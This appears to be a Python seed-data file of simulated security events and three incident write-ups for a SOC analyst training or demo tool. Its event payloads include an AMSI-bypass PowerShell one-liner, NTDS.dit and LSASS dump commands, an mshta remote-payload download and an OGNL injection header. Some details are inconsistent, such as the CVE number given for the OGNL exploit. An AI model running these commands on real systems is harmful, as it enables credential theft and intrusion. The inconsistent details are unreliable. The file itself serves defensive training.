from datetime import datetime, timezone
from typing import List, Dict, Any

def get_seed_events() -> List[Dict[str, Any]]:
    return [
        # --- INCIDENT A: Credential Access & Privileged Account Abuse ---
        {
            "id": "EVT-1001",
            "timestamp": "2026-11-22T08:14:02Z",
            "source_ip": "185.220.101.5",
            "dest_ip": "10.0.1.10",
            "username": "s.patel",
            "hostname": "DC-CORP-01",
            "process_name": "lsass.exe",
            "event_category": "Authentication",
            "severity": "medium",
            "description": "Kerberos pre-authentication failure (Status: 0x18 - Pre-authentication information invalid)",
            "raw_payload": {
                "EventID": 4771,
                "Service": "krbtgt/CORP.LOCAL",
                "ClientAddress": "185.220.101.5",
                "FailureCode": "0x18",
                "TicketOptions": "0x40810010"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1110.001",
            "mitre_technique_name": "Password Spraying",
            "mitre_tactic": "Credential Access"
        },
        {
            "id": "EVT-1002",
            "timestamp": "2026-11-22T08:14:15Z",
            "source_ip": "185.220.101.5",
            "dest_ip": "10.0.1.10",
            "username": "s.patel",
            "hostname": "DC-CORP-01",
            "process_name": "lsass.exe",
            "event_category": "Authentication",
            "severity": "medium",
            "description": "Kerberos pre-authentication failure (Status: 0x18 - Pre-authentication information invalid)",
            "raw_payload": {
                "EventID": 4771,
                "Service": "krbtgt/CORP.LOCAL",
                "ClientAddress": "185.220.101.5",
                "FailureCode": "0x18"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1110.001",
            "mitre_technique_name": "Password Spraying",
            "mitre_tactic": "Credential Access"
        },
        {
            "id": "EVT-1003",
            "timestamp": "2026-11-22T08:14:48Z",
            "source_ip": "185.220.101.5",
            "dest_ip": "10.0.1.10",
            "username": "s.patel",
            "hostname": "DC-CORP-01",
            "process_name": "lsass.exe",
            "event_category": "Authentication",
            "severity": "high",
            "description": "Repeated Kerberos pre-authentication failures detected (Threshold exceeded: 3 attempts within 60s)",
            "raw_payload": {
                "AlertName": "Kerberos Password Spray Threshold",
                "TargetAccount": "s.patel",
                "SourceSubnet": "185.220.101.0/24"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1110.001",
            "mitre_technique_name": "Password Spraying",
            "mitre_tactic": "Credential Access"
        },
        {
            "id": "EVT-1004",
            "timestamp": "2026-11-22T08:16:11Z",
            "source_ip": "185.220.101.5",
            "dest_ip": "10.0.1.10",
            "username": "s.patel",
            "hostname": "DC-CORP-01",
            "process_name": "lsass.exe",
            "event_category": "Authentication",
            "severity": "critical",
            "description": "Successful Kerberos TGT request for privileged account 's.patel' from foreign anomalous IP",
            "raw_payload": {
                "EventID": 4768,
                "TargetUserName": "s.patel",
                "TargetDomainName": "CORP.LOCAL",
                "ClientAddress": "185.220.101.5",
                "GeoIP": "Seychelles / Tor Exit Node",
                "Privileges": ["SeDebugPrivilege", "SeSecurityPrivilege", "SeTcbPrivilege"]
            },
            "is_simulated": True,
            "mitre_technique_id": "T1078.002",
            "mitre_technique_name": "Domain Accounts",
            "mitre_tactic": "Defense Evasion"
        },
        {
            "id": "EVT-1005",
            "timestamp": "2026-11-22T08:17:35Z",
            "source_ip": "10.0.1.10",
            "dest_ip": "10.0.1.10",
            "username": "s.patel",
            "hostname": "DC-CORP-01",
            "process_name": "powershell.exe",
            "event_category": "Process",
            "severity": "critical",
            "description": "Suspicious PowerShell token impersonation and execution with hidden window",
            "raw_payload": {
                "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                "ParentProcess": "wsmprovhost.exe",
                "ProcessID": 4892,
                "ParentProcessID": 1044
            },
            "is_simulated": True,
            "mitre_technique_id": "T1134",
            "mitre_technique_name": "Access Token Manipulation",
            "mitre_tactic": "Privilege Escalation"
        },
        {
            "id": "EVT-1006",
            "timestamp": "2026-11-22T08:19:20Z",
            "source_ip": "10.0.1.10",
            "dest_ip": "10.0.1.10",
            "username": "s.patel",
            "hostname": "DC-CORP-01",
            "process_name": "ntdsutil.exe",
            "event_category": "Endpoint",
            "severity": "critical",
            "description": "Active Directory Database (NTDS.dit) volume snapshot creation invoked via ntdsutil",
            "raw_payload": {
                "CommandLine": "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\Windows\\Temp\\ad_dump' q q",
                "ParentProcess": "powershell.exe",
                "TargetFile": "C:\\Windows\\Temp\\ad_dump\\Active Directory\\ntds.dit"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1003.003",
            "mitre_technique_name": "NTDS",
            "mitre_tactic": "Credential Access"
        },
        {
            "id": "EVT-1007",
            "timestamp": "2026-11-22T08:21:05Z",
            "source_ip": "10.0.1.10",
            "dest_ip": "185.220.101.5",
            "username": "SYSTEM",
            "hostname": "DC-CORP-01",
            "process_name": "svchost.exe",
            "event_category": "Network",
            "severity": "high",
            "description": "Unusual outbound TLS connection initiated from Domain Controller to external IP 185.220.101.5:443",
            "raw_payload": {
                "Protocol": "TCP",
                "DestinationPort": 443,
                "BytesSent": 1845900,
                "BytesReceived": 4210,
                "CertificateSubject": "CN=temp-staging.cloud"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1041",
            "mitre_technique_name": "Exfiltration Over C2 Channel",
            "mitre_tactic": "Exfiltration"
        },

        # --- INCIDENT B: Endpoint Malware & Lateral Movement ---
        {
            "id": "EVT-2001",
            "timestamp": "2026-11-22T09:02:14Z",
            "source_ip": "10.0.3.42",
            "dest_ip": "10.0.3.42",
            "username": "m.reed",
            "hostname": "WS-FIN-042",
            "process_name": "mshta.exe",
            "event_category": "Process",
            "severity": "high",
            "description": "Outlook spawned mshta.exe executing an untrusted inline script attachment (Invoice_Nov26.hta)",
            "raw_payload": {
                "CommandLine": "mshta.exe http://193.142.146.88/assets/payload.hta",
                "ParentProcess": "OUTLOOK.EXE",
                "User": "CORP\\m.reed"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1204.002",
            "mitre_technique_name": "Malicious File",
            "mitre_tactic": "Execution"
        },
        {
            "id": "EVT-2002",
            "timestamp": "2026-11-22T09:02:40Z",
            "source_ip": "10.0.3.42",
            "dest_ip": "10.0.3.42",
            "username": "m.reed",
            "hostname": "WS-FIN-042",
            "process_name": "powershell.exe",
            "event_category": "Process",
            "severity": "critical",
            "description": "Base64 encoded PowerShell payload launched by mshta child process",
            "raw_payload": {
                "CommandLine": "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...",
                "ParentProcess": "mshta.exe",
                "DetectedFamily": "CobaltStrike.Stager"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1059.001",
            "mitre_technique_name": "PowerShell",
            "mitre_tactic": "Execution"
        },
        {
            "id": "EVT-2003",
            "timestamp": "2026-11-22T09:04:15Z",
            "source_ip": "10.0.3.42",
            "dest_ip": "10.0.3.42",
            "username": "SYSTEM",
            "hostname": "WS-FIN-042",
            "process_name": "rundll32.exe",
            "event_category": "Endpoint",
            "severity": "critical",
            "description": "LSASS memory dump attempt intercepted by EDR (comsvcs.dll MiniDump)",
            "raw_payload": {
                "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 648 C:\\temp\\lsass.dmp full",
                "TargetProcess": "lsass.exe (PID 648)",
                "ActionBlocked": False
            },
            "is_simulated": True,
            "mitre_technique_id": "T1003.001",
            "mitre_technique_name": "LSASS Memory",
            "mitre_tactic": "Credential Access"
        },
        {
            "id": "EVT-2004",
            "timestamp": "2026-11-22T09:05:50Z",
            "source_ip": "10.0.3.42",
            "dest_ip": "10.0.3.0/24",
            "username": "m.reed",
            "hostname": "WS-FIN-042",
            "process_name": "net.exe",
            "event_category": "Network",
            "severity": "medium",
            "description": "Internal subnet discovery sweep on port 445 (SMB) initiated from finance workstation",
            "raw_payload": {
                "PortsProbed": [445, 135, 3389],
                "TargetsDiscovered": ["10.0.3.15 (FS-CORP-02)", "10.0.3.18 (PRINT-01)"]
            },
            "is_simulated": True,
            "mitre_technique_id": "T1018",
            "mitre_technique_name": "Remote System Discovery",
            "mitre_tactic": "Discovery"
        },
        {
            "id": "EVT-2005",
            "timestamp": "2026-11-22T09:07:22Z",
            "source_ip": "10.0.3.42",
            "dest_ip": "10.0.3.15",
            "username": "m.reed",
            "hostname": "FS-CORP-02",
            "process_name": "services.exe",
            "event_category": "Authentication",
            "severity": "high",
            "description": "Anomalous SMB remote service execution attempt on file server FS-CORP-02 using harvested credentials",
            "raw_payload": {
                "TargetServer": "FS-CORP-02",
                "ShareName": "\\\\FS-CORP-02\\ADMIN$",
                "Status": "Access Denied (Insufficient Delegation Privileges)"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1021.002",
            "mitre_technique_name": "SMB/Windows Admin Shares",
            "mitre_tactic": "Lateral Movement"
        },

        # --- INCIDENT C: Web Shell Injection & Data Exfiltration ---
        {
            "id": "EVT-3001",
            "timestamp": "2026-11-22T10:12:00Z",
            "source_ip": "91.240.118.82",
            "dest_ip": "10.0.1.50",
            "username": "anonymous",
            "hostname": "WEB-PROD-01",
            "process_name": "nginx",
            "event_category": "Firewall",
            "severity": "critical",
            "description": "WAF Signature Match: CVE-2023-38606 OGNL Injection Remote Code Execution payload in HTTP header",
            "raw_payload": {
                "SignatureID": "WAF-RULE-944240",
                "HTTPMethod": "POST",
                "URI": "/api/v2/customer/upload",
                "HeaderInjected": "Content-Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1190",
            "mitre_technique_name": "Exploit Public-Facing Application",
            "mitre_tactic": "Initial Access"
        },
        {
            "id": "EVT-3002",
            "timestamp": "2026-11-22T10:13:22Z",
            "source_ip": "10.0.1.50",
            "dest_ip": "10.0.1.50",
            "username": "www-data",
            "hostname": "WEB-PROD-01",
            "process_name": "php-fpm",
            "event_category": "Endpoint",
            "severity": "critical",
            "description": "File Integrity Monitoring: Web shell backdoor created in public directory (/var/www/uploads/sysinfo.php)",
            "raw_payload": {
                "FilePath": "/var/www/uploads/sysinfo.php",
                "FileHashMD5": "4a7d1ed81e3a5a7b6e92b3a992e105e1",
                "Action": "File Created with Executable bit"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1505.003",
            "mitre_technique_name": "Web Shell",
            "mitre_tactic": "Persistence"
        },
        {
            "id": "EVT-3003",
            "timestamp": "2026-11-22T10:15:10Z",
            "source_ip": "10.0.1.50",
            "dest_ip": "10.0.1.50",
            "username": "www-data",
            "hostname": "WEB-PROD-01",
            "process_name": "bash",
            "event_category": "Process",
            "severity": "high",
            "description": "Spawned interactive shell commands to enumerate database dumps and private keys",
            "raw_payload": {
                "CommandLine": "/bin/bash -c find /var/backups/ -name '*.sql.gz' -mtime -30",
                "ParentProcess": "php-fpm",
                "User": "www-data"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1083",
            "mitre_technique_name": "File and Directory Discovery",
            "mitre_tactic": "Discovery"
        },
        {
            "id": "EVT-3004",
            "timestamp": "2026-11-22T10:17:45Z",
            "source_ip": "10.0.1.50",
            "dest_ip": "10.0.1.50",
            "username": "www-data",
            "hostname": "WEB-PROD-01",
            "process_name": "tar",
            "event_category": "Process",
            "severity": "medium",
            "description": "Archive utility created compressed multi-file package of customer financial database",
            "raw_payload": {
                "CommandLine": "tar -czf /tmp/.stage_archive.tgz /var/backups/cust_prod_db.sql.gz",
                "ArchiveSize": "5.8 GB"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1560.001",
            "mitre_technique_name": "Archive via Utility",
            "mitre_tactic": "Collection"
        },
        {
            "id": "EVT-3005",
            "timestamp": "2026-11-22T10:20:30Z",
            "source_ip": "10.0.1.50",
            "dest_ip": "91.240.118.82",
            "username": "www-data",
            "hostname": "WEB-PROD-01",
            "process_name": "curl",
            "event_category": "Network",
            "severity": "critical",
            "description": "High-volume data transfer (5.8 GB) over TLS session to suspect external hosting provider",
            "raw_payload": {
                "Destination": "91.240.118.82:8443",
                "BytesTransferred": 5832910400,
                "DurationSeconds": 240,
                "ASN": "AS49981 Bulletproof Hosting"
            },
            "is_simulated": True,
            "mitre_technique_id": "T1041",
            "mitre_technique_name": "Exfiltration Over C2 Channel",
            "mitre_tactic": "Exfiltration"
        },

        # --- BENIGN / NORMAL BACKGROUND EVENTS (Signal-to-Noise) ---
        {
            "id": "EVT-4001",
            "timestamp": "2026-11-22T08:05:10Z",
            "source_ip": "10.0.2.14",
            "dest_ip": "10.0.1.10",
            "username": "k.sharma",
            "hostname": "WS-DEV-014",
            "process_name": "lsass.exe",
            "event_category": "Authentication",
            "severity": "low",
            "description": "Routine Kerberos logon success for employee workstation",
            "raw_payload": {"LogonType": 2, "Status": "Success"},
            "is_simulated": True
        },
        {
            "id": "EVT-4002",
            "timestamp": "2026-11-22T08:10:00Z",
            "source_ip": "10.0.1.15",
            "dest_ip": "10.0.1.10",
            "username": "svc_backup",
            "hostname": "BACKUP-SRV-01",
            "process_name": "backup_agent.exe",
            "event_category": "Endpoint",
            "severity": "low",
            "description": "Scheduled morning enterprise backup snapshot completed successfully",
            "raw_payload": {"Job": "Daily_DC_State", "ExitCode": 0},
            "is_simulated": True
        },
        {
            "id": "EVT-4003",
            "timestamp": "2026-11-22T08:30:22Z",
            "source_ip": "10.0.2.80",
            "dest_ip": "8.8.8.8",
            "username": "system",
            "hostname": "GATEWAY-01",
            "process_name": "dnsmasq",
            "event_category": "Network",
            "severity": "low",
            "description": "DNS query resolution for office365.microsoft.com",
            "raw_payload": {"QueryType": "A", "TTL": 300},
            "is_simulated": True
        },
        {
            "id": "EVT-4004",
            "timestamp": "2026-11-22T09:15:45Z",
            "source_ip": "10.0.1.50",
            "dest_ip": "10.0.1.200",
            "username": "www-data",
            "hostname": "WEB-PROD-01",
            "process_name": "nginx",
            "event_category": "Network",
            "severity": "low",
            "description": "Legitimate API database query to internal Redis cluster",
            "raw_payload": {"Command": "HGETALL session:auth"},
            "is_simulated": True
        },
        {
            "id": "EVT-4005",
            "timestamp": "2026-11-22T09:30:11Z",
            "source_ip": "10.0.3.100",
            "dest_ip": "10.0.1.10",
            "username": "a.mehta",
            "hostname": "WS-HR-003",
            "process_name": "chrome.exe",
            "event_category": "Authentication",
            "severity": "low",
            "description": "OAuth 2.0 Single Sign-On token refreshed for Workday HR portal",
            "raw_payload": {"Provider": "AzureAD", "Status": "Authorized"},
            "is_simulated": True
        },
        {
            "id": "EVT-4006",
            "timestamp": "2026-11-22T10:05:00Z",
            "source_ip": "10.0.1.10",
            "dest_ip": "10.0.1.10",
            "username": "SYSTEM",
            "hostname": "DC-CORP-01",
            "process_name": "TrustedInstaller.exe",
            "event_category": "Process",
            "severity": "low",
            "description": "Windows Defender signature database auto-update definition 1.403.201.0",
            "raw_payload": {"Component": "MpSigStub.exe", "Status": "Success"},
            "is_simulated": True
        }
    ]

def get_seed_incidents() -> List[Dict[str, Any]]:
    return [
        {
            "id": "INC-2026-001",
            "title": "Credential Access & Privileged Account Abuse",
            "summary": "Multiple failed Kerberos pre-authentication attempts from external IP 185.220.101.5 followed by anomalous successful login to Domain Administrator account 's.patel'. Suspicious PowerShell token impersonation and NTDS.dit access detected on Primary Domain Controller DC-CORP-01.",
            "risk_score": 92,
            "severity": "critical",
            "status": "Under Investigation",
            "assigned_to": "Alex Vance (Tier 3 SOC Lead)",
            "first_detected": "2026-11-22T08:14:02Z",
            "last_activity": "2026-11-22T08:21:05Z",
            "affected_users": ["s.patel", "SYSTEM"],
            "affected_hosts": ["DC-CORP-01"],
            "source_ips": ["185.220.101.5"],
            "dest_ips": ["10.0.1.10"],
            "related_event_ids": ["EVT-1001", "EVT-1002", "EVT-1003", "EVT-1004", "EVT-1005", "EVT-1006", "EVT-1007"],
            "mitre_techniques": [
                {
                    "technique_id": "T1110.001",
                    "technique_name": "Password Spraying",
                    "tactic": "Credential Access",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-1001", "EVT-1002", "EVT-1003"],
                    "description": "Rapid successive Kerberos pre-authentication failures (0x18) against admin account s.patel."
                },
                {
                    "technique_id": "T1078.002",
                    "technique_name": "Domain Accounts",
                    "tactic": "Defense Evasion",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-1004"],
                    "description": "Valid domain credentials used from an anomalous external IP originating from Seychelles."
                },
                {
                    "technique_id": "T1134",
                    "technique_name": "Access Token Manipulation",
                    "tactic": "Privilege Escalation",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-1005"],
                    "description": "AMSI bypass and elevated token impersonation executed via hidden PowerShell."
                },
                {
                    "technique_id": "T1003.003",
                    "technique_name": "NTDS",
                    "tactic": "Credential Access",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-1006"],
                    "description": "Volume shadow copy and ntdsutil command used to snapshot the Active Directory database."
                },
                {
                    "technique_id": "T1041",
                    "technique_name": "Exfiltration Over C2 Channel",
                    "tactic": "Exfiltration",
                    "confidence": "potential",
                    "evidence_events": ["EVT-1007"],
                    "description": "Outbound TLS connection to external staging server matching the adversary's initial ingress IP."
                }
            ],
            "timeline_stages": [
                {
                    "id": "STG-01",
                    "stage_name": "Initial Ingress & Password Spray",
                    "timestamp": "2026-11-22T08:14:02Z",
                    "title": "Brute Force Authentication Burst",
                    "description": "3 Kerberos pre-auth failures in under 60 seconds from external IP 185.220.101.5 targeting s.patel.",
                    "related_event_ids": ["EVT-1001", "EVT-1002", "EVT-1003"],
                    "severity": "medium",
                    "entity": "185.220.101.5",
                    "is_inferred": False
                },
                {
                    "id": "STG-02",
                    "stage_name": "Credential Access",
                    "timestamp": "2026-11-22T08:16:11Z",
                    "title": "Domain Administrator TGT Granted",
                    "description": "Successful TGT granted to external IP for high-privilege account s.patel.",
                    "related_event_ids": ["EVT-1004"],
                    "severity": "critical",
                    "entity": "s.patel",
                    "is_inferred": False
                },
                {
                    "id": "STG-03",
                    "stage_name": "Privilege Escalation & Evasion",
                    "timestamp": "2026-11-22T08:17:35Z",
                    "title": "AMSI Bypass & Token Duplication",
                    "description": "Obfuscated PowerShell session spawned under wsmprovhost to bypass local AMSI inspection.",
                    "related_event_ids": ["EVT-1005"],
                    "severity": "critical",
                    "entity": "DC-CORP-01",
                    "is_inferred": False
                },
                {
                    "id": "STG-04",
                    "stage_name": "Credential Harvesting",
                    "timestamp": "2026-11-22T08:19:20Z",
                    "title": "Active Directory Database Snapshot (ntdsutil)",
                    "description": "Creation of full IFM snapshot containing all enterprise password hashes.",
                    "related_event_ids": ["EVT-1006"],
                    "severity": "critical",
                    "entity": "ntdsutil.exe",
                    "is_inferred": False
                },
                {
                    "id": "STG-05",
                    "stage_name": "Staged Exfiltration",
                    "timestamp": "2026-11-22T08:21:05Z",
                    "title": "Outbound Encrypted Exfiltration Channel",
                    "description": "1.84 MB data stream transmitted to adversary command server.",
                    "related_event_ids": ["EVT-1007"],
                    "severity": "high",
                    "entity": "185.220.101.5:443",
                    "is_inferred": True
                }
            ],
            "notes": [
                {
                    "id": "NOTE-1",
                    "author": "Alex Vance (Tier 3 SOC Lead)",
                    "timestamp": "2026-11-22T08:25:00Z",
                    "text": "Initiated triage. Confirmed s.patel is currently on business travel in Singapore; IP 185.220.101.5 geo-locates to a known Seychelles VPS / VPN provider. High probability of credential compromise."
                },
                {
                    "id": "NOTE-2",
                    "author": "Alex Vance (Tier 3 SOC Lead)",
                    "timestamp": "2026-11-22T08:35:12Z",
                    "text": "Tested response simulator. Recommending immediate Kerberos ticket invalidation (KRBTGT password reset) and network isolation of DC-CORP-01 management ports."
                }
            ],
            "evidence_reviewed": ["EVT-1001", "EVT-1004", "EVT-1006"],
            "created_at": "2026-11-22T08:14:02Z"
        },
        {
            "id": "INC-2026-002",
            "title": "Endpoint Malware Execution & Lateral Movement Attempt",
            "summary": "User m.reed on workstation WS-FIN-042 opened an invoice attachment which spawned mshta.exe and initiated an obfuscated PowerShell payload. LSASS memory dump was attempted, followed by network sweep targeting internal file server FS-CORP-02.",
            "risk_score": 84,
            "severity": "high",
            "status": "Open",
            "assigned_to": "Jordan Lee (Tier 2 SOC Analyst)",
            "first_detected": "2026-11-22T09:02:14Z",
            "last_activity": "2026-11-22T09:07:22Z",
            "affected_users": ["m.reed"],
            "affected_hosts": ["WS-FIN-042", "FS-CORP-02"],
            "source_ips": ["10.0.3.42", "193.142.146.88"],
            "dest_ips": ["10.0.3.15", "10.0.3.42"],
            "related_event_ids": ["EVT-2001", "EVT-2002", "EVT-2003", "EVT-2004", "EVT-2005"],
            "mitre_techniques": [
                {
                    "technique_id": "T1204.002",
                    "technique_name": "Malicious File",
                    "tactic": "Execution",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-2001"],
                    "description": "User execution of malicious HTA payload delivered via spearphishing attachment."
                },
                {
                    "technique_id": "T1059.001",
                    "technique_name": "PowerShell",
                    "tactic": "Execution",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-2002"],
                    "description": "Encoded command execution matching known Cobalt Strike stager patterns."
                },
                {
                    "technique_id": "T1003.001",
                    "technique_name": "LSASS Memory",
                    "tactic": "Credential Access",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-2003"],
                    "description": "Attempt to invoke MiniDump on lsass.exe via rundll32 and comsvcs.dll."
                },
                {
                    "technique_id": "T1018",
                    "technique_name": "Remote System Discovery",
                    "tactic": "Discovery",
                    "confidence": "potential",
                    "evidence_events": ["EVT-2004"],
                    "description": "Subnet enumeration querying SMB port 445 on neighboring financial subnets."
                },
                {
                    "technique_id": "T1021.002",
                    "technique_name": "SMB/Windows Admin Shares",
                    "tactic": "Lateral Movement",
                    "confidence": "potential",
                    "evidence_events": ["EVT-2005"],
                    "description": "Unauthorized access attempt targeting ADMIN$ share of FS-CORP-02."
                }
            ],
            "timeline_stages": [
                {
                    "id": "STG-B1",
                    "stage_name": "Initial Execution",
                    "timestamp": "2026-11-22T09:02:14Z",
                    "title": "Spearphishing HTA Spawned",
                    "description": "Outlook spawned mshta.exe with remote download link.",
                    "related_event_ids": ["EVT-2001"],
                    "severity": "high",
                    "entity": "WS-FIN-042",
                    "is_inferred": False
                },
                {
                    "id": "STG-B2",
                    "stage_name": "Staged Payload",
                    "timestamp": "2026-11-22T09:02:40Z",
                    "title": "Encoded PowerShell Injected",
                    "description": "Cobalt Strike beacon memory injection attempt.",
                    "related_event_ids": ["EVT-2002"],
                    "severity": "critical",
                    "entity": "powershell.exe",
                    "is_inferred": False
                },
                {
                    "id": "STG-B3",
                    "stage_name": "Credential Access Attempt",
                    "timestamp": "2026-11-22T09:04:15Z",
                    "title": "LSASS MiniDump Call Intercepted",
                    "description": "Process handle opened to extract plaintext passwords from memory.",
                    "related_event_ids": ["EVT-2003"],
                    "severity": "critical",
                    "entity": "lsass.exe",
                    "is_inferred": False
                },
                {
                    "id": "STG-B4",
                    "stage_name": "Lateral Reconnaissance",
                    "timestamp": "2026-11-22T09:05:50Z",
                    "title": "Subnet SMB Sweep",
                    "description": "Enumeration of fileservers and domain members.",
                    "related_event_ids": ["EVT-2004", "EVT-2005"],
                    "severity": "high",
                    "entity": "FS-CORP-02",
                    "is_inferred": False
                }
            ],
            "notes": [
                {
                    "id": "NOTE-B1",
                    "author": "Jordan Lee (Tier 2 SOC Analyst)",
                    "timestamp": "2026-11-22T09:12:00Z",
                    "text": "User m.reed reported their workstation felt slow after opening an email from 'vendor-invoicing@fastaccounting.io'. Workstation network isolation recommended."
                }
            ],
            "evidence_reviewed": ["EVT-2001", "EVT-2003"],
            "created_at": "2026-11-22T09:02:14Z"
        },
        {
            "id": "INC-2026-003",
            "title": "Web Shell Injection & High-Volume Data Exfiltration",
            "summary": "Public-facing customer web server WEB-PROD-01 (10.0.1.50) received an Apache Struts exploit payload, creating a persistent web shell file in /uploads/. Interactive shell activity performed reconnaissance, followed by an encrypted outbound data transfer of 5.8 GB to bulletproof hosting IP 91.240.118.82.",
            "risk_score": 88,
            "severity": "critical",
            "status": "Open",
            "assigned_to": "Elena Rostova (Threat Intel Lead)",
            "first_detected": "2026-11-22T10:12:00Z",
            "last_activity": "2026-11-22T10:20:30Z",
            "affected_users": ["www-data"],
            "affected_hosts": ["WEB-PROD-01"],
            "source_ips": ["91.240.118.82"],
            "dest_ips": ["10.0.1.50"],
            "related_event_ids": ["EVT-3001", "EVT-3002", "EVT-3003", "EVT-3004", "EVT-3005"],
            "mitre_techniques": [
                {
                    "technique_id": "T1190",
                    "technique_name": "Exploit Public-Facing Application",
                    "tactic": "Initial Access",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-3001"],
                    "description": "WAF detected OGNL injection pattern exploiting CVE-2023-38606 in HTTP upload endpoint."
                },
                {
                    "technique_id": "T1505.003",
                    "technique_name": "Web Shell",
                    "tactic": "Persistence",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-3002"],
                    "description": "File sysinfo.php dropped inside public upload directory with execute permissions."
                },
                {
                    "technique_id": "T1083",
                    "technique_name": "File and Directory Discovery",
                    "tactic": "Discovery",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-3003"],
                    "description": "Reconnaissance commands querying database backup folders for customer records."
                },
                {
                    "technique_id": "T1560.001",
                    "technique_name": "Archive via Utility",
                    "tactic": "Collection",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-3004"],
                    "description": "Tar archive generated combining database dumps into single encrypted staging file."
                },
                {
                    "technique_id": "T1041",
                    "technique_name": "Exfiltration Over C2 Channel",
                    "tactic": "Exfiltration",
                    "confidence": "confirmed",
                    "evidence_events": ["EVT-3005"],
                    "description": "5.8 GB exfiltrated via HTTPS stream to known bulletproof hosting infrastructure."
                }
            ],
            "timeline_stages": [
                {
                    "id": "STG-C1",
                    "stage_name": "RCE Exploitation",
                    "timestamp": "2026-11-22T10:12:00Z",
                    "title": "WAF Signature Triggered",
                    "description": "OGNL payload directed at customer file upload endpoint.",
                    "related_event_ids": ["EVT-3001"],
                    "severity": "critical",
                    "entity": "WEB-PROD-01",
                    "is_inferred": False
                },
                {
                    "id": "STG-C2",
                    "stage_name": "Persistence Planted",
                    "timestamp": "2026-11-22T10:13:22Z",
                    "title": "sysinfo.php Backdoor Dropped",
                    "description": "PHP web shell established in /var/www/uploads/.",
                    "related_event_ids": ["EVT-3002"],
                    "severity": "critical",
                    "entity": "sysinfo.php",
                    "is_inferred": False
                },
                {
                    "id": "STG-C3",
                    "stage_name": "Data Collection & Staging",
                    "timestamp": "2026-11-22T10:17:45Z",
                    "title": "Customer SQL Dump Packaged",
                    "description": "Tar archive staged in /tmp/.stage_archive.tgz.",
                    "related_event_ids": ["EVT-3003", "EVT-3004"],
                    "severity": "high",
                    "entity": "tar",
                    "is_inferred": False
                },
                {
                    "id": "STG-C4",
                    "stage_name": "Exfiltration Complete",
                    "timestamp": "2026-11-22T10:20:30Z",
                    "title": "5.8 GB Transferred to 91.240.118.82",
                    "description": "Data leak to bulletproof provider confirmed by perimeter firewall.",
                    "related_event_ids": ["EVT-3005"],
                    "severity": "critical",
                    "entity": "91.240.118.82:8443",
                    "is_inferred": False
                }
            ],
            "notes": [
                {
                    "id": "NOTE-C1",
                    "author": "Elena Rostova (Threat Intel Lead)",
                    "timestamp": "2026-11-22T10:25:00Z",
                    "text": "IP 91.240.118.82 is attributed to threat cluster UNC2970. Confirmed egress data volume matches customer database backup size. Notifying Legal and Data Protection Officer."
                }
            ],
            "evidence_reviewed": ["EVT-3001", "EVT-3002", "EVT-3005"],
            "created_at": "2026-11-22T10:12:00Z"
        }
    ]
